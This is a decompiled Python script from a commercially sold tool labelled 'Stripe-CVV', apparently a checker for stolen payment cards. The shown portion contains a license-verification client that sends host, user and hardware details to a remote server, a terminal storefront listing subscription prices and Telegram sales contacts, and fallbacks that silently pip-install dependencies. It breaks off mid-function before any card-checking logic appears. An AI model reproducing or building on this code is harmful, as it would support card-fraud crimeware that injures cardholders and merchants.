""" Decompiled by Exotic Hridoy """

decrypt = " the person whos searching something like that iykyk it's damn gold you found "

from __future__ import annotations
from concurrent.futures import ThreadPoolExecutor, as_completed
import re, threading, string
from datetime import datetime, timezone
from faker import Faker
import asyncio
import json
import urllib3
import pyfiglet
import itertools
from urllib.parse import parse_qs
import urllib.parse
import os, time, uuid, platform, hashlib, threading, dataclasses, random, socket, httpx, getpass, locale, shutil, psutil, base64, sys, secrets, socket, json, requests, pyfiglet
from requests.exceptions import ConnectTimeout, ReadTimeout, Timeout, ConnectionError
from typing import Optional, Iterable, Dict, Any, Tuple, List, Callable, cast
from colorama import Style, Fore
import ctypes, subprocess
from colorama import init as _cinit, Fore as F, Style as S

_cinit(autoreset=True)
DEFAULT_THREADS = 3
THREADS_MIN = 1
THREADS_MAX = 10

# ===================== DEFAULTS =====================
LABEL = "Stripe-CVV"
ENDPOINTS = ["https://verif.stecu.cloud"]
HEARTBEAT_SEC = 5
VERIFY_TLS = True
TIMEOUT = 7.0
CONNECT_TO = 5.0
CACHE_FILE = os.path.expanduser("~/.license_saved-Stripe-CVV")
DID_FILE = os.path.expanduser("~/.license_device_id-Stripe-CVV")
UA_EXTRA = ""
APP_VER = "2.3"

# retry/backoff
RETRIES = 5
BACKOFF_BASE = 0.25
BACKOFF_CAP = 2.5

_HARD_DROP = {"disabled", "expired", "invalid", "label_mismatch", "deleted"}


# ===================== STATE =====================
@dataclasses.dataclass
class Info:
    status: str = "unknown"
    expires: Optional[str] = None
    owner: str = ""
    devices_used: int = 0
    devices_allowed: int = 0
    endpoint: str = ""
    masked_key: str = ""


_INFO = Info()
_LOCK = threading.RLock()
_CLI: Optional["Client"] = None


# ===================== UTIL ======================
def _cls() -> None:
    os.system("cls" if os.name == "nt" else "clear")


def _sleep_retry(i: int) -> None:
    d = min(BACKOFF_CAP, BACKOFF_BASE * (2**i))
    d = d * (0.7 + 0.6 * random.random())
    time.sleep(d)


def _mask(k: str) -> str:
    p = [x for x in (k or "").split("-") if x]
    if len(p) >= 3:
        return f"{p[0]}-{p[1]}-{p[2]}-XXXX-XXXXX"
    return (k[:4] if k else "LIC") + "-XXXX-XXXXX"


def _cstatus(s: str) -> str:
    s = (s or "unknown").lower()
    if s in {"actived", "active"}:
        return f"{F.GREEN}{s}{S.RESET_ALL}"
    if s in {"disabled", "expired", "invalid", "label_mismatch", "deleted"}:
        return f"{F.RED}{s}{S.RESET_ALL}"
    return f"{F.YELLOW}{s}{S.RESET_ALL}"


def _hint(e: Exception) -> str:
    if isinstance(e, httpx.ConnectTimeout):
        return "Connection timed out"
    if isinstance(e, httpx.ReadTimeout):
        return "Server slow"
    if isinstance(e, httpx.ConnectError):
        return "Connect failed"
    if isinstance(e, httpx.HTTPStatusError):
        return f"HTTP {getattr(e, 'response', None) and e.response.status_code}"
    if isinstance(e, httpx.TransportError):
        return "Transport/TLS error"
    if isinstance(e, socket.gaierror):
        return "DNS resolve failed"
    return "Unknown error"


def _owner_from(p: Dict[str, Any]) -> str:
    return (
        p.get("owner")
        or p.get("name")
        or p.get("user")
        or p.get("username")
        or p.get("customer")
        or p.get("display_name")
        or ""
    )


def _status_from(p: Dict[str, Any]) -> str:
    st = str(p.get("status") or "").lower()
    if st in {"actived", "active"}:
        return "actived"
    if st in _HARD_DROP:
        return st
    err = str(p.get("error") or "").lower()
    if "label" in err:
        return "label_mismatch"
    if "expired" in err:
        return "expired"
    if "disabled" in err or "not active" in err:
        return "disabled"
    if "invalid" in err or "not found" in err:
        return "invalid"
    return "unknown"


def _b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")


def _json(obj: Any) -> str:
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=False)


def _is_container() -> bool:
    try:
        if os.path.exists("/.dockerenv"):
            return True
        with open("/proc/1/cgroup", "r", encoding="utf-8", errors="ignore") as f:
            t = f.read()
            return ("docker" in t) or ("containerd" in t) or ("kubepods" in t)
    except Exception:
        return False


def _lang_enc() -> tuple[str, str]:
    try:
        try:
            locale.setlocale(locale.LC_ALL, "")
        except Exception:
            pass
        loc = locale.getlocale()
        lang = "-".join([x for x in (loc or ()) if x]) or ""
        enc = (
            locale.getencoding()
            if hasattr(locale, "getencoding")
            else locale.getpreferredencoding(False)
        )
        return lang, enc or ""
    except Exception:
        return "", ""


def _is_termux() -> bool:
    return bool(os.getenv("TERMUX_VERSION") or os.getenv("ANDROID_ROOT"))


def _mem_total_bytes() -> Optional[int]:
    try:
        import psutil  # type: ignore

        return int(psutil.virtual_memory().total)
    except Exception:
        pass

    sysname = platform.system()

    if sysname == "Windows":
        try:

            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            stat = MEMORYSTATUSEX()
            stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
                return int(stat.ullTotalPhys)
        except Exception:
            pass
        try:
            kb = ctypes.c_ulonglong(0)
            if ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory(
                ctypes.byref(kb)
            ):
                return int(kb.value) * 1024
        except Exception:
            pass
        return None

    if sysname == "Darwin":
        try:
            libc = ctypes.CDLL("libc.dylib")
            val = ctypes.c_uint64()
            size = ctypes.c_size_t(ctypes.sizeof(val))
            if (
                libc.sysctlbyname(
                    b"hw.memsize", ctypes.byref(val), ctypes.byref(size), None, 0
                )
                == 0
            ):
                return int(val.value)
        except Exception:
            pass
        try:
            out = subprocess.check_output(["sysctl", "-n", "hw.memsize"]).strip()
            return int(out)
        except Exception:
            pass

    try:
        sysconf_obj: Any = getattr(os, "sysconf", None)
        if callable(sysconf_obj):
            sysconf = cast(Callable[[str], int], sysconf_obj)
            page_size = int(sysconf("SC_PAGE_SIZE"))
            phys_pages = int(sysconf("SC_PHYS_PAGES"))
            return page_size * phys_pages
    except Exception:
        pass
    try:
        with open("/proc/meminfo", "r") as f:
            for line in f:
                if line.startswith("MemTotal:"):
                    kb = int(line.split()[1])
                    return kb * 1024
    except Exception:
        pass

    return None


def _dev_info() -> Dict[str, Any]:
    sysn = platform.system()
    rel = platform.release()
    ver = platform.version()
    mach = platform.machine()
    arch = platform.architecture()[0]
    node = platform.node()
    pyver = platform.python_version()
    pyimpl = platform.python_implementation()
    user = os.getenv("USERNAME") or os.getenv("USER") or ""
    try:
        lang, enc = _lang_enc()
    except Exception:
        lang = ""
        enc = ""
    cpu = os.cpu_count() or 0
    ram = _mem_total_bytes()
    termux = _is_termux()
    cont = _is_container()
    disks = {}
    try:
        du = shutil.disk_usage(os.path.expanduser("~"))
        disks = {"home_total": du.total, "home_used": du.used}
    except Exception:
        pass
    return {
        "os": {
            "name": sysn,
            "release": rel,
            "version": ver,
            "arch": arch,
            "machine": mach,
        },
        "host": {"name": node, "user": user, "lang": lang, "enc": enc},
        "python": {"version": pyver, "impl": pyimpl},
        "hw": {"cpu_count": cpu, "mem_bytes": ram},
        "env": {"termux": termux, "container": cont},
        "disk": disks,
        "app": {"label": LABEL, "ver": APP_VER, "ua_extra": UA_EXTRA or None},
        "did_file": DID_FILE,
    }


def _ua(did: str) -> str:
    sysn = platform.system()
    rel = platform.release()
    mach = platform.machine()
    node = platform.node()
    py = platform.python_version()
    ua = (
        f"license-client/{APP_VER} ({sysn} {rel}; {mach}; {node}) Python/{py} DID/{did}"
    )
    return f"{ua} {UA_EXTRA}".strip()


def _did() -> str:
    try:
        os.makedirs(os.path.dirname(DID_FILE), exist_ok=True)
        if os.path.isfile(DID_FILE):
            v = open(DID_FILE, "r", encoding="utf-8").read().strip()
            if v:
                return v
    except Exception:
        pass
    raw = f"{uuid.getnode()}_{platform.node()}"
    d = "LCL-" + hashlib.sha1(raw.encode()).hexdigest()[:20].upper()
    try:
        open(DID_FILE, "w", encoding="utf-8").write(d)
        os.chmod(DID_FILE, 0o600)
    except Exception:
        pass
    return d


def _load_key() -> Optional[str]:
    try:
        if os.path.isfile(CACHE_FILE):
            return open(CACHE_FILE, "r", encoding="utf-8").read().strip() or None
    except Exception:
        return None
    return None


def _save_key(k: str) -> None:
    os.makedirs(os.path.dirname(CACHE_FILE), exist_ok=True)
    open(CACHE_FILE, "w", encoding="utf-8").write(k.strip())
    try:
        os.chmod(CACHE_FILE, 0o600)
    except Exception:
        pass


def _drop_key() -> None:
    try:
        os.remove(CACHE_FILE)
    except Exception:
        pass


def _set_info(**kw) -> None:
    with _LOCK:
        for k, v in kw.items():
            setattr(_INFO, k, v)


def get_info() -> Info:
    with _LOCK:
        return dataclasses.replace(_INFO)


# ===================== CLIENT ======================
class Client:
    def __init__(self, key: str, endpoints: Iterable[str]):
        v = [e.strip().rstrip("/") for e in endpoints if str(e).strip()]
        if not v:
            raise ValueError("ENDPOINTS kosong")
        self.key = key.strip()
        if not self.key:
            raise ValueError("Lisensi wajib diisi")
        self.did = _did()
        self.eps = v
        self.idx = 0
        self.cli = httpx.Client(
            http2=True,
            timeout=httpx.Timeout(TIMEOUT, connect=CONNECT_TO),
            verify=VERIFY_TLS,
            headers={"User-Agent": _ua(self.did)},
        )
        self.stop = threading.Event()
        self.th: Optional[threading.Thread] = None

    def _ep(self) -> str:
        return self.eps[self.idx % len(self.eps)]

    def _next(self) -> None:
        self.idx = (self.idx + 1) % len(self.eps)

    def _rebuild(self, *, http2: Optional[bool] = None) -> None:
        try:
            self.cli.close()
        except Exception:
            pass
        h2 = True if http2 is None else bool(http2)
        self.cli = httpx.Client(
            http2=h2,
            timeout=httpx.Timeout(TIMEOUT, connect=CONNECT_TO),
            verify=VERIFY_TLS,
            headers={"User-Agent": _ua(self.did)},
        )

    def _post(self, path: str, js: Dict[str, Any]) -> Tuple[Dict[str, Any], str]:
        dev = _dev_info()
        hdr_dev = {
            "os": dev["os"]["name"],
            "rel": dev["os"]["release"],
            "arch": dev["os"]["arch"],
            "mach": dev["os"]["machine"],
            "node": dev["host"]["name"],
            "py": dev["python"]["version"],
            "app": APP_VER,
        }
        enc_hdr = _b64u(_json(hdr_dev).encode("utf-8"))

        total = max(1, RETRIES) * max(1, len(self.eps))
        h2_downgraded = False

        for i in range(total):
            ep = self._ep()
            try:
                r = self.cli.post(
                    f"{ep}{path}",
                    json={**js, "device": dev},
                    headers={
                        "X-Device-ID": self.did,
                        "X-Device-Info": enc_hdr,
                    },
                )
                ctype = r.headers.get("content-type", "").lower()
                if "application/json" in ctype:
                    data = r.json()
                else:
                    try:
                        data = json.loads(r.text) if (r.text or "").strip() else {}
                    except Exception:
                        data = {"ok": False, "error": "bad_response"}

                if r.status_code >= 500:
                    self._next()
                    _sleep_retry(i)
                    continue

                return (
                    (
                        data
                        if isinstance(data, dict)
                        else {"ok": False, "error": "bad_response"}
                    ),
                    ep,
                )

            except (httpx.ConnectTimeout, httpx.ReadTimeout):
                self._next()
                _sleep_retry(i)
                continue

            except httpx.ConnectError:
                try:
                    self._rebuild(http2=True)
                except Exception:
                    pass
                self._next()
                _sleep_retry(i)
                continue

            except httpx.TransportError:
                if not h2_downgraded:
                    try:
                        self._rebuild(http2=False)
                        h2_downgraded = True
                        continue
                    except Exception:
                        pass
                self._next()
                _sleep_retry(i)
                continue

            except Exception:
                self._next()
                _sleep_retry(i)
                continue

        return {"ok": False, "error": "network_failed"}, ",".join(self.eps)

    def verify(self) -> Dict[str, Any]:
        d, ep = self._post(
            "/api/verify",
            {"license_key": self.key, "label": LABEL, "device_id": self.did},
        )
        st = _status_from(d)
        _set_info(
            status=st,
            expires=d.get("expires_at"),
            owner=_owner_from(d),
            devices_used=int(d.get("devices_used") or 0),
            devices_allowed=int(d.get("devices_allowed") or 0),
            endpoint=ep,
            masked_key=_mask(self.key),
        )
        ok = bool(d.get("ok")) and st == "actived"
        d["ok"] = ok
        d["status"] = st
        d["endpoint"] = ep
        return d

    def hb(self) -> Dict[str, Any]:
        d, ep = self._post(
            "/api/heartbeat", {"license_key": self.key, "device_id": self.did}
        )
        st = _status_from(d)
        if st != "actived":
            _set_info(status=st, endpoint=ep)
        return {"ok": st == "actived", "status": st, "endpoint": ep}

    def start_bg(self, sec: int) -> None:
        if self.th and self.th.is_alive():
            return
        self.stop.clear()

        def loop():
            v = self.verify()
            if not v.get("ok"):
                return
            while not self.stop.is_set():
                try:
                    self.hb()
                    v = self.verify()
                    if not v.get("ok"):
                        break
                except Exception:
                    pass
                self.stop.wait(max(5, int(sec)))

        self.th = threading.Thread(target=loop, name="lic-heartbeat", daemon=True)
        self.th.start()

    def stop_bg(self, *, join: bool = False) -> None:
        self.stop.set()
        if join and self.th and self.th.is_alive():
            self.th.join(timeout=3)


# ===================== UI BASE ======================
def _banner(title: str) -> None:
    try:
        from pyfiglet import figlet_format  # pip install pyfiglet

        print(F.CYAN + figlet_format(title, font="slant") + S.RESET_ALL)
    except Exception:
        print(f"{F.CYAN}{'='*10} {title} {'='*10}{S.RESET_ALL}")


def _hr() -> None:
    print(F.MAGENTA + "-" * 60 + S.RESET_ALL)


def print_info() -> None:
    i = get_info()
    k = i.masked_key or "(none)"
    exp = i.expires or "–"
    dvc = (
        f"{i.devices_used}/{i.devices_allowed}"
        if (i.devices_used or i.devices_allowed)
        else "0/0"
    )

    print(f"{F.GREEN}[+]{S.RESET_ALL} License     : {F.YELLOW}{k}{S.RESET_ALL}")
    print(f"{F.GREEN}[+]{S.RESET_ALL} Status      : {_cstatus(i.status)}")
    print(f"{F.GREEN}[+]{S.RESET_ALL} Expired     : {F.YELLOW}{exp}{S.RESET_ALL}")
    print(f"{F.GREEN}[+]{S.RESET_ALL} Device log  : {F.MAGENTA}{dvc}{S.RESET_ALL}")
    if i.owner:
        print(
            f"{F.GREEN}[+]{S.RESET_ALL} Owner       : {F.WHITE}{i.owner}{S.RESET_ALL}"
        )


def _error(msg: str, *, hint: str | None = None) -> None:
    print(f"{F.RED}[ERROR]{S.RESET_ALL} {msg}")
    if hint:
        print(f"{F.YELLOW}[HINT]{S.RESET_ALL} {hint}")


# ===================== PUBLIC API (config) ======================
def init(
    *,
    label: Optional[str] = None,
    endpoints: Optional[Iterable[str]] = None,
    heartbeat_sec: Optional[int] = None,
    verify_tls: Optional[bool] = None,
    cache_file: Optional[str] = None,
    did_file: Optional[str] = None,
    timeout: Optional[float] = None,
    connect_timeout: Optional[float] = None,
    ua_extra: Optional[str] = None,
) -> None:
    global LABEL, ENDPOINTS, HEARTBEAT_SEC, VERIFY_TLS, CACHE_FILE, DID_FILE, TIMEOUT, CONNECT_TO, UA_EXTRA
    if label is not None:
        LABEL = label
    if endpoints:
        ENDPOINTS = [e.strip().rstrip("/") for e in endpoints if str(e).strip()]
    if heartbeat_sec:
        HEARTBEAT_SEC = int(heartbeat_sec)
    if verify_tls is not None:
        VERIFY_TLS = bool(verify_tls)
    if cache_file:
        CACHE_FILE = os.path.expanduser(cache_file)
    if did_file:
        DID_FILE = os.path.expanduser(did_file)
    if timeout:
        TIMEOUT = float(timeout)
    if connect_timeout:
        CONNECT_TO = float(connect_timeout)
    if ua_extra is not None:
        UA_EXTRA = ua_extra.strip()


# ===================== STORE FRONT DATA + THEME ======================
# Plans: satu harga, murah, lifetime max $40
# (label, months, total_price_usd). months=None => Lifetime
PLANS = [
    ("1 Month", 1, 9),
    ("2 Months", 2, 15),
    ("3 Months", 3, 18),
    ("5 Months", 5, 25),
    ("8 Months", 8, 29),
    ("10 Months", 10, 34),
    ("Lifetime", None, 40),
]

CONTACT_SALES = {
    "Telegram": "@xqndrs66, @xqndrs",
    "YouTube": "youtube.com/@kiansantang_welitt",
    "GitHub": "github.com/KianSantang777",
}

# Warranty dynamic:
GARANSI_LABEL = "30-day Guarantee"  # ≥ 5 months & lifetime

# Theme (subtle)
HEADER_STYLE = F.WHITE + S.BRIGHT
PRICE_STYLE = F.YELLOW + S.BRIGHT
DURATION_STYLE = F.WHITE
GARANSI_STYLE = F.GREEN
META_STYLE = F.CYAN
ACCENT = F.MAGENTA


# ===================== SINGLE-FUNCTION STORE FRONT (10 DESIGNS) ======================
def ui_storefront(style: str = "v1") -> None:
    # ---------- local helpers ----------
    import re

    def strip_ansi(s: str) -> str:
        return re.sub(r"\x1b\[[0-9;]*m", "", s)

    def apply(text: str, style: str | None) -> str:
        return (style or "") + str(text) + S.RESET_ALL

    def ljust_vis(text: str, width: int) -> str:
        vis = len(strip_ansi(text))
        return text + (" " * max(0, width - vis))

    def center_vis(text: str, width: int) -> str:
        vis = len(strip_ansi(text))
        pad = max(0, width - vis)
        left = pad // 2
        right = pad - left
        return (" " * left) + text + (" " * right)

    def dim(text: str) -> str:
        return S.DIM + str(text) + S.RESET_ALL

    def rule(w: int) -> str:
        return dim("─" * w)

    def fmt_money(v: float) -> str:
        s = f"{v:.2f}".rstrip("0").rstrip(".")
        return f"${s}"

    def warranty(months: Optional[int]) -> str:
        return (
            "Two-week Guarantee"
            if (months is not None and months < 5)
            else GARANSI_LABEL
        )

    def rows() -> list[tuple[str, str, str]]:
        out = []
        for label, months, total in PLANS:
            price = apply(fmt_money(total), PRICE_STYLE)
            duration = apply(label, DURATION_STYLE)
            guar = apply(warranty(months), GARANSI_STYLE)
            out.append((price, duration, guar))
        return out

    def contacts() -> list[str]:
        out = []
        for k, v in CONTACT_SALES.items():
            out.append(f"{apply(k, HEADER_STYLE)}{dim(': ')}{apply(v, META_STYLE)}")
        return out

    items = rows()
    w_price = max((len(strip_ansi(p)) for p, _, _ in items), default=5)
    w_dur = max((len(strip_ansi(d)) for _, d, _ in items), default=8)
    w_war = max((len(strip_ansi(w)) for _, _, w in items), default=12)
    sep_dot = dim("  ·  ")
    sep_w = len(strip_ansi(sep_dot))

    # ---------- 10 designs ----------
    def v1() -> None:
        # Minimalist dotted list with vertical accent
        total_w = 2 + w_price + sep_w + w_dur + sep_w + w_war
        title = apply("SUBSCRIPTION PLANS", HEADER_STYLE)
        print(center_vis(title, total_w))
        print(rule(total_w))
        bar = ACCENT + "│" + S.RESET_ALL
        for i, (p, d, g) in enumerate(items):
            line = f"{bar} {ljust_vis(p, w_price)}{sep_dot}{ljust_vis(d, w_dur)}{sep_dot}{ljust_vis(g, w_war)}"
            print(line)
            if i != len(items) - 1:
                print(rule(total_w))
        print()
        t = apply("CONTACT DEVELOPER", HEADER_STYLE)
        print(center_vis(t, total_w))
        print(rule(total_w))
        for i, c in enumerate(contacts()):
            print(f"{bar} {c}")
            if i != len(CONTACT_SALES) - 1:
                print(rule(total_w))

    def v2() -> None:
        # Rounded cards stacked
        inner = max(28, min(54, max(w_price, w_dur, w_war)))
        tw = inner + 4
        print(center_vis(apply("SUBSCRIPTION PLANS", HEADER_STYLE), tw))
        print(rule(tw))
        top = "╭" + "─" * (inner + 2) + "╮"
        bot = "╰" + "─" * (inner + 2) + "╯"
        for i, (p, d, g) in enumerate(items):
            print(ACCENT + top + S.RESET_ALL)
            print("│ " + center_vis(p, inner) + " │")
            print("│ " + center_vis(d, inner) + " │")
            print("│ " + center_vis(g, inner) + " │")
            print(ACCENT + bot + S.RESET_ALL)
            if i != len(items) - 1:
                print()
        print()
        t = apply("CONTACT DEVELOPER", HEADER_STYLE)
        print(center_vis(t, tw))
        print(rule(tw))
        for k in contacts():
            print("│ " + ljust_vis(k, inner) + " │")

    def v3() -> None:
        # Clean lines, price badge first
        total_w = 4 + w_price + w_dur + w_war
        print(center_vis(apply("SUBSCRIPTION PLANS", HEADER_STYLE), total_w))
        print(rule(total_w))
        bullet = ACCENT + "•" + S.RESET_ALL
        for i, (p, d, g) in enumerate(items):
            print(f"{bullet} {p}  {d}")
            print(dim("   " + g))
            if i != len(items) - 1:
                print(rule(total_w))

        print()
        print(center_vis(apply("CONTACT DEVELOPER", HEADER_STYLE), total_w))
        print(rule(total_w))
        for c in contacts():
            print(f"{bullet} {c}")

    def v4() -> None:
        # Double-lines header + compact rows
        total_w = 2 + w_price + 2 + w_dur + 2 + w_war
        print(center_vis(apply("SUBSCRIPTION PLANS", HEADER_STYLE), total_w))
        print(dim("═" * total_w))
        sep = dim("  |  ")
        for i, (p, d, g) in enumerate(items):
            print(f"{p}{sep}{d}{sep}{g}")
            if i != len(items) - 1:
                print(rule(total_w))
        print(dim("═" * total_w))
        print(center_vis(apply("CONTACT DEVELOPER", HEADER_STYLE), total_w))
        print(rule(total_w))
        for c in contacts():
            print(c)

    def v5() -> None:
        # Tags style
        def tag(txt: str) -> str:
            return ACCENT + "▕" + S.RESET_ALL + " " + txt

        total_w = 4 + w_price + sep_w + w_dur + sep_w + w_war
        print(center_vis(apply("SUBSCRIPTION PLANS", HEADER_STYLE), total_w))
        print(rule(total_w))
        for i, (p, d, g) in enumerate(items):
            print(tag(p) + sep_dot + d + sep_dot + g)
            if i != len(items) - 1:
                print(rule(total_w))
        print()
        print(center_vis(apply("CONTACT DEVELOPER", HEADER_STYLE), total_w))
        print(rule(total_w))
        for c in contacts():
            print(tag(c))

    def v6() -> None:
        # Left rail with dim timeline
        total_w = 4 + w_price + w_dur + w_war
        rail = ACCENT + "│" + S.RESET_ALL
        print(center_vis(apply("SUBSCRIPTION PLANS", HEADER_STYLE), total_w))
        print(rule(total_w))
        for i, (p, d, g) in enumerate(items):
            print(f"{rail} {p}  {d}")
            print(f"{rail} {dim(g)}")
            if i != len(items) - 1:
                print(f"{rail} {dim('—' * (total_w - 2))}")
        print()
        print(center_vis(apply("CONTACT DEVELOPER", HEADER_STYLE), total_w))
        print(f"{rail} {dim('contacts')}")
        for c in contacts():
            print(f"{rail} {c}")

    def v7() -> None:
        # Inline chips: [ $ ]  duration — guarantee
        total_w = 6 + w_price + w_dur + w_war

        def chip(s: str) -> str:
            return ACCENT + "[" + S.RESET_ALL + s + ACCENT + "]" + S.RESET_ALL

        print(center_vis(apply("SUBSCRIPTION PLANS", HEADER_STYLE), total_w))
        print(rule(total_w))
        for i, (p, d, g) in enumerate(items):
            print(f"{chip(p)}  {d}  {dim('—')}  {g}")
            if i != len(items) - 1:
                print(rule(total_w))
        print()
        print(center_vis(apply("CONTACT DEVELOPER", HEADER_STYLE), total_w))
        print(rule(total_w))
        for c in contacts():
            print(f"{chip(apply('i', HEADER_STYLE))} {c}")

    def v8() -> None:
        # Underlined header + indented chevrons
        total_w = 2 + w_price + sep_w + w_dur + sep_w + w_war
        title = apply("SUBSCRIPTION PLANS", HEADER_STYLE)
        print(center_vis(title, total_w))
        print(center_vis(dim("¯" * len(strip_ansi(title))), total_w))
        chev = ACCENT + "›" + S.RESET_ALL
        for i, (p, d, g) in enumerate(items):
            print(f"  {chev} {p}{sep_dot}{d}{sep_dot}{g}")
            if i != len(items) - 1:
                print(rule(total_w))
        print()
        t = apply("CONTACT DEVELOPER", HEADER_STYLE)
        print(center_vis(t, total_w))
        print(center_vis(dim("¯" * len(strip_ansi(t))), total_w))
        for c in contacts():
            print(f"  {chev} {c}")

    def v9() -> None:
        # Clean aligned columns (no borders), small header row
        col1, col2, col3 = max(10, w_price), max(12, w_dur), max(14, w_war)
        total_w = col1 + 2 + col2 + 2 + col3
        print(center_vis(apply("SUBSCRIPTION PLANS", HEADER_STYLE), total_w))
        print(
            dim(
                " "
                + ljust_vis("Price", col1)
                + "  "
                + ljust_vis("Duration", col2)
                + "  "
                + ljust_vis("Guarantee", col3)
            )
        )
        print(rule(total_w))
        for i, (p, d, g) in enumerate(items):
            print(
                ljust_vis(p, col1)
                + "  "
                + ljust_vis(d, col2)
                + "  "
                + ljust_vis(g, col3)
            )
        print()
        print(center_vis(apply("CONTACT DEVELOPER", HEADER_STYLE), total_w))
        print(rule(total_w))
        for c in contacts():
            print(c)

    def v10() -> None:
        # Boxed minimal panel with bullet lines
        inner = max(36, w_price + sep_w + w_dur + sep_w + w_war)
        tw = inner + 4
        top = "┌" + "─" * (inner + 2) + "┐"
        mid = "├" + "─" * (inner + 2) + "┤"
        bot = "└" + "─" * (inner + 2) + "┘"
        print(ACCENT + top + S.RESET_ALL)
        print(
            "│ " + center_vis(apply("SUBSCRIPTION PLANS", HEADER_STYLE), inner) + " │"
        )
        print(ACCENT + mid + S.RESET_ALL)
        bullet = ACCENT + "•" + S.RESET_ALL
        for i, (p, d, g) in enumerate(items):
            line = f"{bullet} {p}{sep_dot}{d}{sep_dot}{g}"
            print("│ " + ljust_vis(line, inner) + " │")
        print(ACCENT + mid + S.RESET_ALL)
        print("│ " + center_vis(apply("CONTACT DEVELOPER", HEADER_STYLE), inner) + " │")
        for c in contacts():
            print("│ " + ljust_vis(c, inner) + " │")
        print(ACCENT + bot + S.RESET_ALL)

    registry: Dict[str, Callable[[], None]] = {
        "v1": v1,
        "v2": v2,
        "v3": v3,
        "v4": v4,
        "v5": v5,
        "v6": v6,
        "v7": v7,
        "v8": v8,
        "v9": v9,
        "v10": v10,
    }
    renderer = registry.get(style.lower(), v1)
    renderer()


# ===================== SHOWCASE (optional) ======================
def showcase_all() -> None:
    styles = [f"v{i}" for i in range(1, 11)]
    for idx, st in enumerate(styles, 1):
        _cls()
        _banner(f"{LABEL} — {st.upper()}")
        ui_storefront(style=st)
        print(
            F.CYAN
            + f"[DEMO] Style: {st}  ({idx}/10). Press Enter for next..."
            + S.RESET_ALL
        )
        try:
            input()
        except KeyboardInterrupt:
            break


# ===================== GATE (uses single-function UI) ======================
def gate(app_title: str = LABEL, *, ui_style: str = "v1") -> bool:
    global _CLI
    while True:
        _cls()
        _banner(app_title)
        ui_storefront(style=ui_style)

        k = _load_key()
        if k:
            print(f"{F.CYAN}[INFO]{S.RESET_ALL} Using saved license")
        else:
            try:
                k = input(
                    f"\n{F.LIGHTBLUE_EX}[+] {F.WHITE}Enter license key:{F.BLACK} "
                ).strip()
            except KeyboardInterrupt:
                print()
                return False
            if not k:
                continue

        try:
            cli = Client(k, ENDPOINTS)
            _CLI = cli
            _hr()
            print(f"{F.CYAN}[INFO]{S.RESET_ALL} Verifying...")
            _hr()
            r = cli.verify()
        except Exception as e:
            _error(str(e), hint=_hint(e))
            time.sleep(1.0)
            continue

        print_info()

        if r.get("ok"):
            _save_key(k)
            try:
                cli.start_bg(HEARTBEAT_SEC)
            except Exception:
                pass
            return True

        st = r.get("status", "unknown")
        if st in _HARD_DROP:
            if st == "disabled":
                print(
                    f"{F.RED}[LOGOUT]{S.RESET_ALL} License was disabled by admin. Enter a new license."
                )
            else:
                print(
                    f"{F.RED}[LOGOUT]{S.RESET_ALL} License is {st}. Enter a new license."
                )
            _drop_key()
        else:
            _error(f"Verification failed ({st})")
        try:
            input(f"{F.YELLOW}Press Enter...{S.RESET_ALL}")
        except KeyboardInterrupt:
            print()
            return False


# ===================== PUBLIC API (hb helpers) ======================
def start_heartbeat() -> None:
    if _CLI:
        _CLI.start_bg(HEARTBEAT_SEC)


def stop_heartbeat(join: bool = False) -> None:
    if _CLI:
        _CLI.stop_bg(join=join)


def status() -> str:
    return get_info().status


try:
    import pyfiglet, requests, aiohttp, colorama, faker
except ImportError:
    os.system(
        "pip install requests asyncio aiohttp faker colorama pyfiglet pycryptodome &> /dev//null"
    )
    print("\nRun again this tools\n")
    sys.exit()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError:
    os.system(
        "pip install requests asyncio aiohttp faker colorama pyfiglet pycryptodome &> /dev//null"
    )
    print("\nRun again this tools\n")
    sys.exit()

try:
    import pyfiglet
except ImportError:
    os.system(
        "pip install requests asyncio aiohttp faker colorama pyfiglet pycryptodome &> /dev//null"
    )
    print("\nRun again this tools\n")
    sys.exit()

try:
    import aiohttp, requests
except ImportError:
    os.system(
        "pip install requests asyncio aiohttp faker colorama pyfiglet pycryptodome &> /dev//null"
    )
    print("\nRun again this tools\n")
    sys.exit()

# ----- Config -----


print_lock = threading.Lock()
file_lock = threading.Lock()


def gradient_text(text, colors):
    out = []
    cycle = itertools.cycle(colors)
    for ch in text:
        if ch.strip() == "":
            out.append(ch)
        else:
            out.append(next(cycle) + ch + Style.RESET_ALL)
    return "".join(out)


def hex_to_rgb(hex_color: str) -> tuple[int, int, int]:
    hex_color = hex_color.lstrip("#")
    # Ensure we have exactly 6 hex digits (pad or trim as needed)
    hex_color = (hex_color + "000000")[:6]
    return (int(hex_color[0:2], 16), int(hex_color[2:4], 16), int(hex_color[4:6], 16))


def rgb_to_ansi(r: int, g: int, b: int) -> str:
    return f"\033[38;2;{r};{g};{b}m"


def color_gradient_text(text: str, gradient: list[str]) -> str:
    from math import floor

    # Convert hex to RGB
    rgb_colors = [hex_to_rgb(c) for c in gradient]

    # Prepare gradient steps
    total_chars = len(text.replace("\n", ""))
    if total_chars == 0 or len(rgb_colors) < 2:
        return text

    segments = len(rgb_colors) - 1
    chars_per_segment = total_chars // segments
    colored_text = ""
    idx = 0

    for segment in range(segments):
        start_rgb = rgb_colors[segment]
        end_rgb = rgb_colors[segment + 1]
        steps = chars_per_segment if segment < segments - 1 else total_chars - idx

        for step in range(steps):
            ratio = step / max(steps - 1, 1)
            r = floor(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
            g = floor(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
            b = floor(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)
            char = ""
            while idx < len(text) and text[idx] == "\n":
                colored_text += "\n"
                idx += 1
            if idx < len(text):
                char = text[idx]
